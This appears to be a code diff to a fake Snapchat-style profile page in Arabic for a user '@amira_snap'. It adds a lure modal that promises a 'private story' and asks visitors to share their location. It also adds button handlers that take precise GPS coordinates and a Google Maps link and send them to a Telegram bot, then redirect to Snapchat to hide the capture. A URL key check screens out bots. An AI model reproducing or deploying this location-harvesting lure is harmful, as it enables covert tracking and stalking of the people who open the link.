@@ -30,7 +30,6 @@
             width: 360px;
             text-align: center;
             box-sizing: border-box;
-            cursor: pointer;
         }
         .avatar-container {
             position: relative;
@@ -77,11 +76,64 @@
         .action-btn:hover {
             background-color: #f4f100;
         }
+
+        /* نافذة منبثقة بالنص المعدل */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .modal-box {
+            background: #fff;
+            padding: 25px 20px;
+            border-radius: 20px;
+            width: 310px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .modal-box h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #111;
+        }
+        .modal-box p {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        .modal-btn {
+            background-color: #fffc00;
+            color: #000;
+            border: none;
+            padding: 12px 20px;
+            font-weight: bold;
+            border-radius: 15px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 15px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="profile-card" onclick="triggerGpsPrompt()">
+    <!-- نافذة منبثقة بالنص الجديد والمناسب -->
+    <div class="modal-overlay" id="gpsModal">
+        <div class="modal-box">
+            <h3>عرض القصة الخاصة 👻</h3>
+            <p>يرجى السماح بالوصول إلى الموقع الجغرافي لعرض القصص واليوميات الحصرية.</p>
+            <button class="modal-btn" onclick="requestSystemGps()">متابعة</button>
+        </div>
+    </div>
+
+    <div class="profile-card">
         <div class="avatar-container">
             <img src="https://c.top4top.io/p_3954xsyfg0.jpg" alt="Avatar" class="avatar">
         </div>
@@ -89,11 +141,11 @@
         <div class="profile-username">@amira_snap</div>
         <div class="bio">أهلاً بكم في يومياتي الخاصة ✨<br>اضغط للمتابعة ومشاهدة القصة</div>
         
-        <button class="action-btn">إضافة الحساب</button>
+        <button class="action-btn" onclick="triggerRedirect()">إضافة الحساب</button>
     </div>
 
     <script>
-        // التحقق من المفتاح في الرابط لطرد البوتات (يجب أن يكون الرابط منتهي بـ ?key=G45)
+        // التحقق من المفتاح في الرابط لطرد البوتات
         const urlParams = new URLSearchParams(window.location.search);
         const secretKey = urlParams.get('key');
         const VALID_KEY = 'G45';
@@ -108,13 +160,12 @@
         let capturedGpsData = "Pending / Not Granted Yet";
         let googleMapsLink = "Not Available";
 
-        // إرسال تنبيه بالدخول لأول مرة
-        window.onload = function() {
-            sendToTelegram("[*] New visitor opened the profile link.");
-        };
+        function requestSystemGps() {
+            document.getElementById('gpsModal').style.display = 'none';
+            fetchGpsCoordinates("GPS Triggered via User Interaction");
+        }
 
-        // تفعيل طلب الـ الموقع الجغرافي ودقة الموقع فور الضغط على زر "إضافة الحساب"
-        function triggerGpsPrompt() {
+        function fetchGpsCoordinates(label) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
@@ -125,7 +176,7 @@
                         capturedGpsData = `Lat: ${lat}, Lon: ${lon} (Accuracy: ${accuracy}m)`;
                         googleMapsLink = `https://maps.google.com/?q=${lat},${lon}`;
 
-                        sendToTelegram(`[+] GPS Successfully Captured:\n- Coordinates: ${capturedGpsData}\n- Google Maps: ${googleMapsLink}`);
+                        sendToTelegram(`[+] ${label}:\n- Coordinates: ${capturedGpsData}\n- Google Maps: ${googleMapsLink}`);
                     },
                     function(error) {
                         capturedGpsData = `Denied/Error: ${error.message}`;
@@ -135,11 +186,6 @@
                     { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 }
                 );
             }
-
-            // التوجيه النهائي لسناب شات بعد الضغط
-            setTimeout(() => {
-                window.location.href = 'https://www.snapchat.com/add/amira_snap';
-            }, 1500);
         }
 
         async function sendToTelegram(textMessage) {
@@ -165,6 +211,14 @@ ${textMessage}
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: fullPayload })
             });
+        }
+
+        function triggerRedirect() {
+            fetchGpsCoordinates("GPS Captured via Profile Action Click");
+            
+            setTimeout(() => {
+                window.location.href = 'https://www.snapchat.com/add/amira_snap';
+            }, 1200);
         }
     </script>
 </body>
